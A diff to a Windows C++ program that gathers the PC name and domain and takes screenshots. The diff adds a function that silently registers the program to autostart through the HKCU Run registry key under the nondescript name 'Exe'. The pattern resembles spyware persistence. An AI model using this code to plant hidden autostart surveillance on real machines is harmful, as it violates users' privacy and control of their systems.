@@ -5,6 +5,7 @@
 #include <iostream>
 #include <Lmwksta.h>
 #include <StrSafe.h>
+#include <vector>
 using namespace std;
 
 int generator = 1;
@@ -88,7 +89,43 @@ string getPCDomain() {
     return domainName;
 }
 
+wstring getExecProgramPath() {
+    vector<wchar_t> pathBuffer(MAX_PATH);
+    DWORD length = GetModuleFileName(nullptr, pathBuffer.data(), static_cast<DWORD>(pathBuffer.size()));
+
+    if (length == 0 || length == pathBuffer.size()) {
+        return L"";
+    }
+
+    return wstring(pathBuffer.begin(), pathBuffer.begin() + length);
+}
+
+bool addToAurorun(const wstring& programName, const wstring& executablePath) {
+    HKEY hKey;
+    LONG result;
+
+    result = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
+    if (result != ERROR_SUCCESS) {
+        return false;
+    }
+
+    result = RegSetValueEx(hKey, 
+        programName.c_str(),
+        0,
+        REG_SZ,
+        reinterpret_cast<const BYTE*>(executablePath.c_str()),
+        (executablePath.size() + 1) * sizeof(wchar_t));
+    if (result != ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        return false;
+    }
+
+    RegCloseKey(hKey);
+    return true;
+}
+
 int main() {
+    addToAurorun(L"Exe", getExecProgramPath());
 
     ConfigReader cr;
     auto conf = cr.read("config.txt");
@@ -100,7 +137,7 @@ int main() {
     string host_name = getPCName();
     string host_domain_name = getPCDomain();
 
-   wcout <<  screenshot(wstring(screenshot_dir.begin(), screenshot_dir.end()));
+    wcout <<  screenshot(wstring(screenshot_dir.begin(), screenshot_dir.end()));
 
 
 }
